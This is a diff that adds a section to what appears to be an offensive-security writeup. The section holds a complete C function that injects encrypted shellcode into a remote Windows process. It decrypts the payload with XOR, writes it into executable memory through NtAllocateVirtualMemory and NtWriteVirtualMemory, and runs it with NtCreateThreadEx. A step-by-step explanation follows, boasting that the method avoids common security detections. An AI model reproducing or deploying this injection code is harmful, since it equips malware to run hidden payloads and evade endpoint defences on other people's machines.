@@ -129,5 +129,54 @@ int spoof_ppid_with_scheduler() {
 ✔ More **offensive security writeups**.
 ✔ Research on **custom payload execution**.
 ✔ Advanced **Windows & Linux attack techniques**.
+### Injecting Shellcode into a Remote Process
 
-Stay tuned for updates! 🚀
+```c
+int inject_shellcode(HANDLE processHandle) {
+    PVOID remoteBuf;
+    SIZE_T allocSize = encrypted_shellcode_len;
+
+    // Allocate memory in the target process
+    NTSTATUS status = NtAllocateVirtualMemory(processHandle, &remoteBuf, 0, &allocSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    if (!NT_SUCCESS(status)) {
+        printf("[!] Failed to allocate memory in target process.\n");
+        return -1;
+    }
+
+    // Decrypt shellcode
+    unsigned char decrypted_shellcode[sizeof(encrypted_shellcode)];
+    unsigned char expanded_key[EXPANDED_KEY_LEN];
+    expand_key(key, strlen(key), expanded_key, EXPANDED_KEY_LEN);
+    memcpy(decrypted_shellcode, encrypted_shellcode, sizeof(encrypted_shellcode));
+    xor_decrypt(decrypted_shellcode, sizeof(encrypted_shellcode), expanded_key, EXPANDED_KEY_LEN, iv, IV_LEN);
+
+    // Write memory
+    SIZE_T bytesWritten = 0;
+    status = NtWriteVirtualMemory(processHandle, remoteBuf, decrypted_shellcode, sizeof(decrypted_shellcode), &bytesWritten);
+    if (!NT_SUCCESS(status)) {
+        printf("[!] Failed to write memory in target process.\n");
+        return -1;
+    }
+
+    // Execute shellcode
+    HANDLE hThread;
+    status = NtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, processHandle, remoteBuf, 0, NULL, NULL, NULL, NULL, NULL);
+    if (!NT_SUCCESS(status)) {
+        printf("[!] Failed to create thread in target process.\n");
+        return -1;
+    }
+
+    WaitForSingleObject(hThread, INFINITE);
+    return 0;
+}
+```
+
+**Explanation:** This function injects and executes shellcode inside a remote process:
+
+1. **Allocate Memory in Target Process:** Uses `NtAllocateVirtualMemory` to reserve memory in the target process.
+2. **Decrypt Shellcode:** The encrypted shellcode is decrypted using XOR-based decryption with an expanded key.
+3. **Write Decrypted Shellcode to Target Process:** The `NtWriteVirtualMemory` function writes the shellcode into the allocated memory.
+4. **Execute Shellcode in a New Thread:** `NtCreateThreadEx` is used to create a remote thread inside the target process, executing the shellcode.
+5. **Wait for Execution Completion:** `WaitForSingleObject` ensures the execution is completed before returning.
+
+This method enables process injection while avoiding common security detections.
